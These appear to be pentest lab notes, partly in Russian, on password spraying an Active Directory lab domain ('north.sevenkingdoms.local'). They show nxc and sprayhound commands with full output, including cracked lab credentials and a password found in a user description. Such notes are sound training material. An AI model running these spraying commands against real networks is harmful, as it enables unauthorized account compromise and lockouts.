
#### nxc
###### password spray
```
┌──(kali㉿kali)-[~]
└─$ nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)                                                                                                                                                                      
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\sql_svc:sql_svc STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\jeor.mormont:jeor.mormont STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\samwell.tarly:samwell.tarly STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\jon.snow:jon.snow STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor 

```
###### проверка счётчиков неудачных авторизаций

```
┌──(kali㉿kali)-[~]
└─$ nxc smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.11   445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-             
SMB         192.168.56.11   445    WINTERFELL       Administrator                 2024-12-31 08:35:25 1       Built-in account for administering the computer/domain                                                                                                            
SMB         192.168.56.11   445    WINTERFELL       Guest                         <never>             1       Built-in account for guest access to the computer/domain                                                                                                          
SMB         192.168.56.11   445    WINTERFELL       krbtgt                        2024-12-31 09:07:19 1       Key Distribution Center Service Account                                                                                                                           
SMB         192.168.56.11   445    WINTERFELL       vagrant                       2021-05-12 11:38:55 0       Vagrant User 
SMB         192.168.56.11   445    WINTERFELL       arya.stark                    2024-12-31 09:59:12 1       Arya Stark 
SMB         192.168.56.11   445    WINTERFELL       eddard.stark                  2024-12-31 09:59:16 1       Eddard Stark 
SMB         192.168.56.11   445    WINTERFELL       catelyn.stark                 2024-12-31 09:59:19 1       Catelyn Stark 
SMB         192.168.56.11   445    WINTERFELL       robb.stark                    2024-12-31 09:59:22 0       Robb Stark 
SMB         192.168.56.11   445    WINTERFELL       sansa.stark                   2024-12-31 09:59:25 1       Sansa Stark 
SMB         192.168.56.11   445    WINTERFELL       brandon.stark                 2024-12-31 09:59:28 1       Brandon Stark 
SMB         192.168.56.11   445    WINTERFELL       rickon.stark                  2024-12-31 09:59:31 1       Rickon Stark 
SMB         192.168.56.11   445    WINTERFELL       hodor                         2024-12-31 09:59:34 0       Brainless Giant 
SMB         192.168.56.11   445    WINTERFELL       jon.snow                      2024-12-31 09:59:36 1       Jon Snow 
SMB         192.168.56.11   445    WINTERFELL       samwell.tarly                 2024-12-31 09:59:39 0       Samwell Tarly (Password : Heartsbane)                                                                                                                             
SMB         192.168.56.11   445    WINTERFELL       jeor.mormont                  2024-12-31 09:59:41 1       Jeor Mormont 
SMB         192.168.56.11   445    WINTERFELL       sql_svc                       2024-12-31 09:59:43 1       sql service 
SMB         192.168.56.11   445    WINTERFELL       [*] Enumerated 16 local users: NORTH

```

#### sprayhound

```
┌──(kali㉿kali)-[~]
└─$ sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 --lower
[!] BEWARE ! You are going to test user/pass without providing a valid domain user
[!] Without a valid domain user, tested account may be locked out as we're not able to determine password policy and bad password count
    Continue anyway? [y/N] y
[+] 16 users will be tested
[+] 0 users will not be tested
    Continue? [Y/n] y
[+] [  VALID  ] hodor : hodor
[+] [  VALID  ] vagrant : vagrant
[+] 2 user(s) have been owned !
    Do you want to set them as 'owned' in Bloodhound ? [Y/n] y
[X] An error occurred while executing SprayHound

```